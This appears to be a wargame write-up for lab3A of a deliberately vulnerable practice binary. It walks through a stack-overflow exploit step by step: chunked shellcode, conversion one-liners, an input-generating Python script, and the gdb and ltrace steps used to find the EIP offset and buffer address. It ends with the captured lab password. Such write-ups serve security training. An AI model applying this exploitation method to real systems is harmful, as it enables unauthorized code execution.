I modified my assembly from lab2B to use only 7 bytes at a time then fill the next 5 with
2d 00 00 00 00, I used this to make every third index ( 00 00 00 00 ) in the data simply be
subtracted from eax, so no change happens. the modified assembly is attached.

I got the raw shellcode in the same way that I did from lab3B but wrote a regex
to replace \x2d\x00\x00\x00 with \x2d\n which chopped it up into the raw shellcode which
is attached.

format raw shellcode into hex:
cat raw_shellcode.txt| perl -pe "s/\\\x//g" | perl -pe "s/\n//g" | perl -pe "s/(........)/0x\1\n/g"

convert raw hex shellcode to decimal:
cat raw_hex_shellcode.txt | xargs printf '%d\n' > raw_dec_shellcode.txt

I wrote this  python script to generate the input
def make_store(numbers):
    sindex = 1
    for n in numbers:
        print("store")
        print(n)
        print(sindex)
        sindex += 1
        if sindex % 3 == 0:
            sindex += 1 manually adding input

I manually added the last entry which overwrites EIP
store
3221222572
113
quit

I found 113 via gdb by using i frame and getting the difference from the start of
data and the address of eip which I then converted to decimal and it gave me 113

to find the address outside of gdb (3221222672) I ran ltrace to find the address of cmd
then subtracted 400 from it (0x190) to get to the start of data then add 4 to it
get to data[1].

running the input gives us the password
lab3A@warzone:/tmp/newb3A/tmp2$ cat ../input.txt | /levels/lab3/lab3A
----------------------------------------------------
  Welcome to doom's crappy number storage service!  
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   doom has reserved some storage for himself :>    
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
sw00g1ty_sw4p_h0w_ab0ut_d3m_h0ps

